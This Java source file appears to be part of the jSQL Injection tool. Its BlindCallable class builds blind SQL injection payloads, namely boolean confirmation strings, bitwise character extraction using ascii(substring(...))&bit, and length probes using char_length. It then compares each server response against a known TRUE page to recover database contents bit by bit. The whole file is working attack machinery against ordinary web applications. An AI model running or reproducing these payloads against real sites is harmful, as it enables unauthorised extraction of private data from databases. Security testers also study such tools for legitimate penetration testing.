package com.jsql.model.blind;

import java.util.LinkedList;

/**
 * Define a call HTTP to the server, require the associated url, character position and bit.
 * Opcodes represents the differences between the TRUE page, and the resulting page
 */
public class BlindCallable implements IBlindCallable<BlindCallable>{
    // The URL called
    private String blindUrl;
    // Character position
    private int currentIndex;
    // Bit searched
    private int currentBit;

    // Default call used for bit test
    private boolean isLengthTest = false;
    // List of differences found between the TRUE page, and the present page
    private LinkedList<diff_match_patch.Diff> opcodes;
    
	// Constructor for preparation and blind confirmation
    BlindCallable(String urlTest){
        blindUrl = "+and+"+urlTest+"--+";
    }
    // Constructor for bit test
    BlindCallable(String inj, int indexCharacter, int bit){
    	blindUrl = "+and+ascii(substring("+inj+","+indexCharacter+",1))%26"+bit+"--+";
        currentIndex = indexCharacter;
        currentBit = bit;
    }
    // Constructor for length test
    BlindCallable(String newUrl, int indexCharacter, boolean newIsLengthTest){
    	blindUrl = "+and+char_length("+newUrl+")>"+indexCharacter+"--+";
        isLengthTest = newIsLengthTest;
    }

    /**
     * Check if a result page means the SQL query is true,
     * confirm that nothing in the resulting page is also defined in the pages from every FALSE SQL queries,
     * @return true if the current SQL query is true
     */
    public boolean isTrue() {
        for( diff_match_patch.Diff falseDiff: ConcreteBlindInjection.constantFalseMark){
            if(opcodes.contains(falseDiff)){
                return false;
            }
        }
        return true;
    }

    /**
     * Process the URL HTTP call, use function inject() from the model
     * Build the list of differences found between TRUE and the current page
     */
    @Override
    public BlindCallable call() throws Exception {
        String ctnt = ConcreteBlindInjection.callUrl(blindUrl);
        opcodes = new diff_match_patch().diff_main(ConcreteBlindInjection.blankTrueMark, ctnt, true);
        new diff_match_patch().diff_cleanupEfficiency(opcodes);
        return this;
    }

    public LinkedList<diff_match_patch.Diff> getOpcodes() {
		return opcodes;
	}
    
	public boolean getisLengthTest() {
		return isLengthTest;
	}
	
	public int getCurrentIndex() {
		return currentIndex;
	}
	
	public int getCurrentBit() {
		return currentBit;
	}
}